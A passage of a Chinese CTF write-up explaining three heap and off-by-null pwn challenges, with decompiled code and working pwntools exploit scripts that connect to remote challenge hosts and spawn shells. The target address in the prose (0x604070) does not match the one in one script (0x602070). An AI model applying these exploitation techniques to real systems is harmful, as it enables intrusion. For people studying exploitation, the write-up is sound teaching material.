free，并且给出的libc版本是2.23，没有tcachebin，0x28大小的chunk释放完直接就会进fastbin。题目只有add和del两个可以操作chunk的函数，在add的同时可以向chunk写入内容。</p><p>现在题目有个后门，只要在0x604070出写入0x666就可以getshell，也就是要满足任意地址写。观察程序发现del函数里free完chunk之后没有置空指针，存在UAF漏洞，但是只能在add的时候编辑chunk内容。所以我们利用UAF来实现doublefree，然后伪造劫持fd，修改fastbin链表，达到申请到目标地址的目的。需要注意的是，fastbin链表中存的地址是chunk地址，也就是说，我们要写入fd的地址应该是target-0x10。</p><p>下面来思考利用方式。我们申请两个chunk，再释放掉这两个chunk之后，fastbin长这样：</p><p><img src="https://c-lby.github.io/images/newstar_week4_wp/Double_%E9%87%8A%E6%94%BE%E5%90%8Efastbin.png" alt="Double_释放后fastbin"></p><p>那么我们在申请一个chunk就会被分配到chunk0，也就是0x2442000处的chunk；申请第二个chunk则会申请到chunk1，第三个是chunk0。链表到此为止就结束了，因为如果我们在申请时向chunk写入了一些内容但并非有效指针，那他就不会再继续从fastbin里取出chunk。但是如果我们向chunk0中写入target-0x10的地址，因为我们释放了两次chunk0，这个fd对于链表中被取出的chunk0无效，但是对于未被取出的chunk0有效。所以申请第一个chunk后写入目标地址，然后申请两个垃圾chunk，再申请一个chunk就是我们想要的地址了，此时写入0x666就可以完成目标。</p><p><img src="https://c-lby.github.io/images/newstar_week4_wp/Double_%E5%8A%AB%E6%8C%81fd%E5%90%8E%E7%9A%84%E9%93%BE%E8%A1%A8.png" alt="Double_劫持fd后的链表"></p><p>(这个是另一个gdb了，所以地址不太一样，但是000结尾的是chunk0,030结尾的是chunk1)</p><h5 id="EXP："><a href="#EXP：" class="headerlink" title="EXP："></a>EXP：</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>, <span class="number">26771</span>)</span><br><span class="line"><span class="comment"># r = process(&quot;./Double&quot;)</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">launch_gdb</span>():</span><br><span class="line">    context.terminal == [<span class="string">&#x27;xdce4-terminal&#x27;</span>, <span class="string">&#x27;-x&#x27;</span>, <span class="string">&#x27;sh&#x27;</span>, <span class="string">&#x27;-c&#x27;</span>]</span><br><span class="line">    gdb.attach(proc.pidof(r)[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">idx, content</span>):</span><br><span class="line">    r.sendlineafter(<span class="string">b&#x27;&gt;&#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">b&quot;Input idx&quot;</span>, idx)</span><br><span class="line">    r.sendafter(<span class="string">b&quot;Input content&quot;</span>, content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    r.sendlineafter(<span class="string">b&#x27;&gt;&#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">b&quot;Input idx&quot;</span>, idx)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check</span>():</span><br><span class="line">    r.sendlineafter(<span class="string">b&#x27;&gt;&#x27;</span>, <span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">target = <span class="number">0x602070</span></span><br><span class="line"></span><br><span class="line">add(<span class="string">b&#x27;0&#x27;</span>, <span class="string">b&#x27;aaaaaaaa&#x27;</span>)</span><br><span class="line">add(<span class="string">b&#x27;1&#x27;</span>, <span class="string">b&#x27;bbbbbbbb&#x27;</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line">delete(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">delete(<span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="string">b&#x27;2&#x27;</span>, p64(target-<span class="number">0x10</span>))</span><br><span class="line"><span class="comment"># launch_gdb()</span></span><br><span class="line">add(<span class="string">b&#x27;3&#x27;</span>, <span class="string">b&#x27;cccccccc&#x27;</span>)</span><br><span class="line">add(<span class="string">b&#x27;4&#x27;</span>, <span class="string">b&#x27;dddddddd&#x27;</span>)</span><br><span class="line">add(<span class="string">b&#x27;5&#x27;</span>, p64(<span class="number">0x666</span>))</span><br><span class="line"></span><br><span class="line">check()</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h3 id="0x02-game"><a href="#0x02-game" class="headerlink" title="0x02 game"></a>0x02 game</h3><h5 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h5><p>都是mihoyo害了出题人（不是<br>这道题很有意思，主要考察的是off by null的知识点，藏得蛮隐蔽的，可能是我对这种漏洞还不够熟悉。先来看看主函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall __noreturn <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// [rsp+0h] [rbp-20h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [rsp+4h] [rbp-1Ch] BYREF</span></span><br><span class="line">  <span class="type">char</span> v5[<span class="number">8</span>]; <span class="comment">// [rsp+8h] [rbp-18h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// [rsp+10h] [rbp-10h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// [rsp+14h] [rbp-Ch]</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line">  <span class="type">int</span> v9; <span class="comment">// [rsp+1Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  init();</span><br><span class="line">  v7 = <span class="number">0</span>;</span><br><span class="line">  choice(&amp;v6);</span><br><span class="line">  <span class="built_in">puts</span>(&amp;byte_2060);                             <span class="comment">// 现在你可以开始探险了</span></span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(a1);                               <span class="comment">// 扣1送原石</span></span><br><span class="line">        <span class="built_in">puts</span>(a2);                               <span class="comment">// 扣2送kfc联名套餐</span></span><br><span class="line">        __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v4);</span><br><span class="line">        <span class="keyword">if</span> ( v4 != <span class="number">1</span> )</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">if</span> ( v6 == <span class="number">1</span> )                          <span class="comment">// 如果选了三月七则没得送原石</span></span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;no way!&quot;</span>);</span><br><span class="line">          <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ( !v6 )</span><br><span class="line">        &#123;</span><br><span class="line">          v9 = <span class="number">1</span>;</span><br><span class="line">          v7 += <span class="number">0x10000</span>;</span><br><span class="line">          <span class="built_in">puts</span>(&amp;byte_20A8);                     <span class="comment">// 恭喜你完成一次委托</span></span><br><span class="line">          <span class="keyword">if</span> ( v7 &gt; <span class="number">0x3FFFF</span> )</span><br><span class="line">            <span class="built_in">printf</span>(&amp;format, &amp;system);           <span class="comment">// 打印出system的libc地址</span></span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( v4 != <span class="number">2</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">if</span> ( !v6 )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;no way!&quot;</span>);                        <span class="comment">// 选派蒙不能选KFC套餐</span></span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( v6 == <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v8 = <span class="number">1</span>;</span><br><span class="line">        <span class="built_in">puts</span>(&amp;byte_2108);                       <span class="comment">// 有什么想对肯德基爷爷说的吗?</span></span><br><span class="line">        myread(v5, <span class="number">8LL</span>);                        <span class="comment">// 把\n换成了\x00</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v4 != <span class="number">3</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( v9 != <span class="number">1</span> || v8 != <span class="number">1</span> )                   <span class="comment">// 1,2两个选项至少要分别执行一遍,利用off by null来实现</span></span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;you are good mihoyo player!&quot;</span>);</span><br><span class="line">    __isoc99_scanf(<span class="string">&quot;%hd&quot;</span>, &amp;v3);                 <span class="comment">// %hd是短整型</span></span><br><span class="line">    ((<span class="type">void</span> (__fastcall *)(<span class="type">char</span> *))((<span class="type">char</span> *)&amp;<span class="built_in">puts</span> - v3 - v7))(v5);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>choice函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">_DWORD *__fastcall <span class="title function_">choice</span><span class="params">(_DWORD *a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  _DWORD *result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// [rsp+1Ch] [rbp-4h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(&amp;s);                                     <span class="comment">// 请选择你的伙伴</span></span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v2);</span><br><span class="line">  <span class="keyword">if</span> ( v2 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v2 != <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;no way!&quot;</span>);                          <span class="comment">// 只能选1或0</span></span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(&amp;byte_203D);                           <span class="comment">// 三月七</span></span><br><span class="line">    result = a1;</span><br><span class="line">    *a1 = <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(&amp;byte_2021);                           <span class="comment">// 派蒙</span></span><br><span class="line">    result = a1;</span><br><span class="line">    *a1 = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>myread函数，也是这个程序的漏洞所在：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">myread</span><span class="params">(<span class="type">unsigned</span> __int8 *a1, <span class="type">int</span> a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+1Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( !a2 )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; a2; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)read(<span class="number">0</span>, a1, <span class="number">1uLL</span>) != <span class="number">1</span> )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">1LL</span>;</span><br><span class="line">    <span class="keyword">if</span> ( *a1 == <span class="string">&#x27;\n&#x27;</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      *a1 = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">return</span> *a1;</span><br><span class="line">    &#125;</span><br><span class="line">    *++a1 = <span class="number">0</span>;                                  <span class="comment">// off by null</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> (__int64)a1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h5><p>myread自定义了读取函数，对输入的字符串做了截断处理，但是强行增加一个截断符在字符串后面就导致了一个null字节的溢出。主函数中储存读取的字符串的数组是v5，长度是8，在栈上紧接着就是变量v6,用来储存角色的选择。所以也就是说这个off by null可以使v6变成0。<br>我们再来看主函数，首先选择角色，然后选择任务，但是对应角色只能做对应任务。其中选择派蒙，做满4次任务1就可以得到system地址，而选择三月七做任务2则可以触发myread函数的执行。在任务处如果选择3，如果1和2任务都做过，那么就可以执行&amp;puts - v3 - v7处的函数，并且以v5为参数。这里的puts地址指的是libc的地址，很容易就能想到构造system(&#x2F;bin&#x2F;sh)来getshell。但是角色只能选一次，想要两个任务都做到触发这个函数指针的调用，只能利用刚刚发现的off by null的漏洞。<br>首先角色先选1，然后做任务2，传入&#x2F;bin&#x2F;sh给v5，一定要保证输入字节够8个，才能溢出一个null给v6。这时候就可以做任务1了。如果题目附件没给libc文件，则需要做四次任务1来获得靶机的system地址以找到对应的libc版本。但是这里题目附件给了libc文件，所以直接通过symbols方法就能获取libc中puts和system的偏移，不需要真的执行4次（当然除非偏移很大真的需要或者你想要这么做除外。）这里需要注意一下一个地方，可能是我太久没做pwn题了，一开始思考偏移的时候我竟然想着要用extern段的相对位置，也就是下图0x4090和0x4058的差值。但是其实程序在运行时链接动态库后，这里会指向got表，也就是libc的地址，所以要找偏移要找libc中的偏移。</p><p><img src="https://c-lby.github.io/images/newstar_week4_wp/game_extern%E6%AE%B5.png" alt="game_extern段"></p><p>通过以下语句可以得到地址偏移是0x32190</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">libc = ELF(<span class="string">&quot;./libc-2.31.so&quot;</span>)</span><br><span class="line">log.success(<span class="built_in">hex</span>(libc.symbols[<span class="string">&#x27;puts&#x27;</span>]-libc.symbols[<span class="string">&#x27;system&#x27;</span>]))</span><br></pre></td></tr></table></figure><h5 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># r = process(&quot;./game&quot;)</span></span><br><span class="line">r = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>, <span class="number">28734</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc-2.31.so&quot;</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">log.success(<span class="built_in">hex</span>(libc.symbols[<span class="string">&#x27;puts&#x27;</span>]-libc.symbols[<span class="string">&#x27;system&#x27;</span>]))  <span class="comment"># 0x32190</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sendla</span>(<span class="params">content</span>):</span><br><span class="line">    r.recv()</span><br><span class="line">    r.sendline(content.encode())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sendla(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">sendla(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">sendla(<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sendla(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">sendla(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">sendla(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sendla(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">sendla(<span class="built_in">str</span>(<span class="number">0x2190</span>))</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="0x03-ezheap"><a href="#0x03-ezheap" class="headerlink" title="0x03 ezheap"></a>0x03 ezheap</h3><p>这题是看着官方WP复现的，主要漏洞是UAF，还学了一些新的知识。这题也是一道经典的菜单堆题。一共可以申请16个note，每个note由一个chunk来维护note信息，我们称为data，和一个chunk来储存note内容，我们把他叫做content。</p><h5 id="结构体的恢复"><a href="#结构体的恢复" class="headerlink" title="结构体的恢复"></a>结构体的恢复</h5><p>根据add函数的代码不难推测data用来存放一个结构体，前八个字节用来存size，最后八个字节用来存content的地址，中间则为0。我们可以在IDA中恢复这个结构体：</p><p>先在structure页面创建对应结构体<br><img src="https://c-lby.github.io/images/newstar_week4_wp/ezheap%E7%BB%93%E6%9E%84%E4%BD%93.png" alt="ezheap结构体"><br>然后将notebook的数据类型改为struct Data*<br><img src="https://c-lby.github.io/images/newstar_week4_wp/ezheap%E6%9B%B4%E6%94%B9%E7%BB%93%E6%9E%84%E4%BD%93%E7%B1%BB%E5%9E%8B.png" alt="ezheap更改结构体类型"><br>这样代码看起来会顺眼一点。</p><h5 id="UAF漏洞的利用"><a href="#UAF漏洞的利用" class="headerlink" title="UAF漏洞的利用"></a>UAF漏洞的利用</h5><p>程序还会将一个note的size存在notesize数组里，显然程序里会有一个关于size的简单的检查。我们再看delete函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">delete</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">signed</span> <span class="type">int</span> idx; <span class="comment">// [rsp+4h] [rbp-Ch]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  idx = read_idx();</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)idx &lt; <span class="number">0x10</span> &amp;&amp; *(&amp;notebook + idx) )<span class="comment">// 没清空结构体</span></span><br><span class="line">    <span class="built_in">free</span>(*(&amp;notebook + idx));                   <span class="comment">// UAF漏洞，而且没释放写过的content的地址，只释放了notebook数据的chunk</span></span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Invalid index&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>UAF漏洞给了我们机会可以申请到某个note的data处，这样可以对data进行打印或者修改，达到读写的目的。因为delete的时候程序只释放了data而没有释放content，所以我们只要先释放两个note，然后再申请一个和data一样大小的note，这样新的content就是第一个释放的data。</p><h5 id="libc地址的泄露"><a href="#libc地址的泄露" class="headerlink" title="libc地址的泄露"></a>libc地址的泄露</h5><p>题目给了libc文件，很自然可以想到要泄露libc地址然后劫持某个函数为system就好了。官方WP给出的泄露libc地址的方法是，申请一个mmap大小范围的chunk，这个chunk的地址和libc靠得很近，打印这个note的data通过计算就可以得到libc基址。然后去网上学习了一下关于mmap申请内存的知识，得知malloc时如果申请的内存大于128kb就会交给mmap来分配，而他管理的内存是一个独立的内存页，刚好在libc加载地址的上面（低地址处）。自己写程序试验了一下，确实mmap分配的地址和0x7fxxxxxxxx很近：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> *a = (<span class="type">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x40000</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Mmap allocated at: %p\n&quot;</span>, a);</span><br><span class="line">    <span class="type">char</span> *b = (<span class="type">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x40</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Brk allocated at: %p\n&quot;</span>, b);</span><br><span class="line">    <span class="built_in">free</span>(a);</span><br><span class="line">    <span class="built_in">free</span>(b);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果：</p><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Mmap</span> allocated at: <span class="number">0x7fc84bc85010</span></span><br><span class="line"><span class="type">Brk</span> allocated at: <span class="number">0x555acfc816b0</span></span><br></pre></td></tr></table></figure><p>WP给出接收libc基址的语句是：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">libc_base=u64(recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x10</span>+<span class="number">0x41000</span></span><br></pre></td></tr></table></figure><p>这里的-0x10是从mem到chunk地址的计算，+0x40000显然是刚刚申请的mmap内存大小，但是这个0x1000是哪来的呢？花了半个小时去翻了glibc2.31的源码（实际上我并不知道是哪个版本的glibc，但其实根据给出的libc文件中函数偏移应该是可以确定的），最后在sysmalloc函数里找到了相关的语句：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">         Round to a multiple of page size.</span></span><br><span class="line"><span class="comment">         If MORECORE is not contiguous, this ensures that we only call it</span></span><br><span class="line"><span class="comment">         with whole-page arguments.  And if MORECORE is contiguous and</span></span><br><span class="line"><span class="comment">         this is not first time through, this preserves page-alignment of</span></span><br><span class="line"><span class="comment">         previous calls. Otherwise, we correct to page-align below.</span></span><br><span class="line"><span class="comment">       */</span></span><br><span class="line">size = ALIGN_UP (size, pagesize);</span><br></pre></td></tr></table></figure><p>mmap申请的chunk有一个特殊的对齐要求，他必须是pagesize，也就是0x1000的倍数。比方说我申请了一个0x40000大小的chunk，加上存放chunk数据的0x10，就有0x40010大小，要对齐，最终就会分配出0x41000大小的chunk。</p><h5 id="劫持-free-hook-getshell"><a href="#劫持-free-hook-getshell" class="headerlink" title="劫持__free_hook &amp; getshell"></a>劫持__free_hook &amp; getshell</h5><p>回到题目，泄露了libc后，就要考虑system的执行了。这里的libc版本是2.31（通过偏移可以查），所以可以通过劫持__free_hook来getshell。</p><p>__free_hook对我来说也是个新东西，因为我开始学习的2.35版本glibc已经取消了hook函数。hook钩子是一个弱类型的函数指针，它指向free(), malloc()等函数。比如__free_hook，若它不为空，则执行它所指向的函数。所以我们可以通过劫持hook来改变程序的执行流。</p><p>题目里data处存放着content的地址指向content，那么我们可以构造__free_hook指向system的libc地址。edit函数会对data的size字段做检查，所以修改指针的时候要注意保留size不变，这样才能成功修改content为system地址，最后再修改一个data为&#x2F;bin&#x2F;sh然后delete掉这个chunk就getshell了。</p><h5 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span 